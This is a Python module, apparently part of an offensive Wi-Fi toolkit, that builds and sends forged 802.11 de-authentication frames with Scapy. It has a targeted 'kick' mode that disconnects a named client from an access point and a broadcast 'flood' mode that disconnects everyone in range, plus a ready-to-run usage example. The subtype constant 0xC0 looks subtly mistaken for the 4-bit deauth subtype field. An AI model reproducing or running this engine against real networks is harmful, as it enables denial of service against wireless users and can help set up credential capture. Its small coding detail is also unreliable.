"""
gotchi.attacks.deauth
=====================

Asynchronous engine that sends IEEE 802.11 de-authentication frames.

Two operating modes
-------------------
* **kick**  – targeted BSSID ⇆ client bursts (default)
* **flood** – broadcast “room-wiper” for DoS testing

External usage example
----------------------
    from gotchi.attacks.deauth import DeauthEngine
    import asyncio

    async def main():
        eng = DeauthEngine(iface="wlan0mon", pps_limit=50)
        await eng.start()
        await eng.kick("AA:BB:CC:DD:EE:FF", "11:22:33:44:55:66")
        await asyncio.sleep(2)
        await eng.stop()

    asyncio.run(main())
"""
from __future__ import annotations

import asyncio
import contextlib
import logging
from typing import Optional, Tuple

try:
    from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp        # noqa: WPS433
except ImportError as exc:                                           # pragma: no cover
    raise RuntimeError(
        "Scapy is required → `pip install scapy`"
    ) from exc

from ..utils.rate_limit import TokenBucket  # local helper

DOT11_DEAUTH_SUBTYPE = 0xC0
BROADCAST = "ff:ff:ff:ff:ff:ff"

log = logging.getLogger(__name__)


class DeauthEngine:
    """De-authentication sender with token-bucket rate limiting."""

    def __init__(
        self,
        *,
        iface: str,
        pps_limit: int = 50,
        mode: str = "kick",
        burst_count: int = 16,
        bucket_capacity: Optional[int] = None,
    ) -> None:
        self.iface = iface
        self.mode = mode.lower()
        if self.mode not in {"kick", "flood"}:
            raise ValueError("mode must be 'kick' or 'flood'")

        self.burst_count = max(1, burst_count)
        self.bucket = TokenBucket(rate=pps_limit,
                                  capacity=bucket_capacity or pps_limit)

        self._targets: "asyncio.Queue[Tuple[str, str, int]]" = asyncio.Queue()
        self._task: Optional[asyncio.Task] = None
        self._stop_evt = asyncio.Event()

        self._channel: Optional[int] = None  # updated by set_channel()

    # ───────────────────────── control ───────────────────────── #

    async def start(self) -> None:
        if self._task and not self._task.done():
            return
        self._stop_evt.clear()
        worker = self._flood_worker if self.mode == "flood" else self._kick_worker
        self._task = asyncio.create_task(worker())
        log.info("🚀 DeauthEngine started (%s, iface=%s)", self.mode, self.iface)

    async def stop(self) -> None:
        self._stop_evt.set()
        if self._task:
            self._task.cancel()
            with contextlib.suppress(asyncio.CancelledError):
                await self._task
        # drain the queue
        while not self._targets.empty():
            with contextlib.suppress(asyncio.QueueEmpty):
                self._targets.get_nowait()
        self._task = None
        log.info("🛑 DeauthEngine stopped")

    # ───────────────────────── public API ───────────────────────── #

    async def kick(
        self, bssid: str, client: str, count: Optional[int] = None
    ) -> None:
        """Enqueue a targeted burst."""
        await self._targets.put(
            (bssid.lower(), client.lower(), count or self.burst_count)
        )

    def set_channel(self, ch: int) -> None:
        """Record current channel (for logging/debug)."""
        self._channel = ch

    # ───────────────────────── internal workers ───────────────────────── #

    async def _kick_worker(self) -> None:
        while not self._stop_evt.is_set():
            try:
                bssid, client, n = await asyncio.wait_for(
                    self._targets.get(), timeout=0.1
                )
            except asyncio.TimeoutError:
                continue

            frame = (
                RadioTap()
                / Dot11(
                    type=0,
                    subtype=DOT11_DEAUTH_SUBTYPE,
                    addr1=client,
                    addr2=bssid,
                    addr3=bssid,
                )
                / Dot11Deauth(reason=7)
            )

            sent = 0
            for _ in range(n):
                if not self.bucket.consume(1):
                    await asyncio.sleep(0.01)
                    continue
                sendp(frame, iface=self.iface, verbose=False)
                sent += 1

            log.debug(
                "📤 deauth %s → %s (%d pkts, ch %s)",
                client,
                bssid,
                sent,
                self._channel or "?",
            )

    async def _flood_worker(self) -> None:
        frame = (
            RadioTap()
            / Dot11(
                type=0,
                subtype=DOT11_DEAUTH_SUBTYPE,
                addr1=BROADCAST,
                addr2=BROADCAST,
                addr3=BROADCAST,
            )
            / Dot11Deauth(reason=7)
        )

        while not self._stop_evt.is_set():
            if self.bucket.consume(1):
                sendp(frame, iface=self.iface, verbose=False)
            else:
                await asyncio.sleep(0.01)


__all__ = ["DeauthEngine"]
